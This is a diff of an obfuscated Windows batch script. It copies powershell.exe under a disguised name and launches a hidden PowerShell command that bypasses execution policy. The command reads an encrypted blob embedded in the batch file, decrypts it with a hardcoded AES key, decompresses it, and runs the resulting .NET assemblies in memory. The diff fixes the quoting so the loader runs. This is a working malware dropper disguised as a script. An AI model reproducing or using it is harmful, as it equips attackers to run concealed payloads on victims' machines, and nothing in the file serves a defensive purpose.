@@ -16,10 +16,10 @@ set "nOAjqwxOWj=powe"
 set "IoiAqaVMIU=Powe"
 set "ocZsEEDeqt=1.0\"
 set "eGOuXHDfAL=ll\v"
-set "eOCHWxBEEF=exe
+set "eOCHWxBEEF=exe""
 set "atqNdyhGqZ=Wind"
 set "IPvppKfUQn=em32"
-copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y "script.bat.exe
+copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y "script.bat.exe"
 set "evHTLasVFk=cls"
 cls
 set "evHTLasVFk=cd "C:\Users\al\Downloads\""
@@ -113,7 +113,7 @@ set "kmRUNdlwoK= '')"
 set "sKZmnYwsPK=var "
 set "AqVVbXxnDl=UUzN"
 set "UeGEtxdZSP=ypto"
-set "zCgJWixVBh=exe
+set "zCgJWixVBh=exe""
 set "LyhwAdTOlf=ncti"
 set "BpntAnTBoB=rMod"
 set "VvWxZiUGJF=gGVH"
@@ -418,7 +418,7 @@ set "QtUghqzKzW=urit"
 set "aBmVnzULHT=Star"
 set "PSGObflUoQ=Syst"
 set "ufCWrlvluF=ewLi"
-"script.bat.exe -noprofile -w hidden -ep bypass -c function Fbeoh($mFNAo){$iXJIL = New-Object System.Security.Cryptography.AesManaged $iXJIL.Mode = [System.Security.Cryptography.CipherMode]::CBC $iXJIL.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7 $iXJIL.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('Lr4NiLStqX3UdzutZvYwYYtj9Ez58eS8jNWXIlTkGhA=') $iXJIL.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('6CuNPRuXSknKV6Qs32reEQ==') $cmijf = $iXJIL.CreateDecryptor() $return_var = $cmijf.TransformFinalBlock($mFNAo  0  $mFNAo.Length) $cmijf.Dispose() $iXJIL.Dispose() $return_var }function cbcsc($mFNAo){$fzpVA = New-Object System.IO.MemoryStream(  $mFNAo) $exbkw = New-Object System.IO.MemoryStream $uNBpQ = New-Object System.IO.Compression.GZipStream($fzpVA  [IO.Compression.CompressionMode]::Decompress) $uNBpQ.CopyTo($exbkw) $uNBpQ.Dispose() $fzpVA.Dispose() $exbkw.Dispose() $exbkw.ToArray() }function GzhXy($mFNAo  $uJBWk){$sgGVH = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')([byte[]]$mFNAo) $WzheY = $sgGVH.EntryPoint $WzheY.Invoke($null  $uJBWk) }$cwxLI = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('C:\Users\al\Downloads\script.bat').Split([Environment]::NewLine) foreach ($gEEcC in $cwxLI) { if ($gEEcC.StartsWith(':: ')) {  $WtslL = $gEEcC.Substring(3)  break  }  } $fzumd = $WtslL.Split('\') $UUzNc = cbcsc (Fbeoh ([System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($fzumd[0]))) $XTgjc = cbcsc (Fbeoh ([System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($fzumd[1]))) GzhXy $XTgjc $null GzhXy $UUzNc (  [string[]] ('')) 
+"script.bat.exe" -noprofile -w hidden -ep bypass -c function Fbeoh($mFNAo){$iXJIL = New-Object System.Security.Cryptography.AesManaged $iXJIL.Mode = [System.Security.Cryptography.CipherMode]::CBC $iXJIL.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7 $iXJIL.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('Lr4NiLStqX3UdzutZvYwYYtj9Ez58eS8jNWXIlTkGhA=') $iXJIL.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('6CuNPRuXSknKV6Qs32reEQ==') $cmijf = $iXJIL.CreateDecryptor() $return_var = $cmijf.TransformFinalBlock($mFNAo  0  $mFNAo.Length) $cmijf.Dispose() $iXJIL.Dispose() $return_var }function cbcsc($mFNAo){$fzpVA = New-Object System.IO.MemoryStream(  $mFNAo) $exbkw = New-Object System.IO.MemoryStream $uNBpQ = New-Object System.IO.Compression.GZipStream($fzpVA  [IO.Compression.CompressionMode]::Decompress) $uNBpQ.CopyTo($exbkw) $uNBpQ.Dispose() $fzpVA.Dispose() $exbkw.Dispose() $exbkw.ToArray() }function GzhXy($mFNAo  $uJBWk){$sgGVH = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')([byte[]]$mFNAo) $WzheY = $sgGVH.EntryPoint $WzheY.Invoke($null  $uJBWk) }$cwxLI = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('C:\Users\al\Downloads\script.bat').Split([Environment]::NewLine) foreach ($gEEcC in $cwxLI) { if ($gEEcC.StartsWith(':: ')) {  $WtslL = $gEEcC.Substring(3)  break  }  } $fzumd = $WtslL.Split('\') $UUzNc = cbcsc (Fbeoh ([System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($fzumd[0]))) $XTgjc = cbcsc (Fbeoh ([System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($fzumd[1]))) GzhXy $XTgjc $null GzhXy $UUzNc (  [string[]] ('')) 
 set "zCgJWixVBh= /b"
 set "evHTLasVFk=exit"
 exit /b
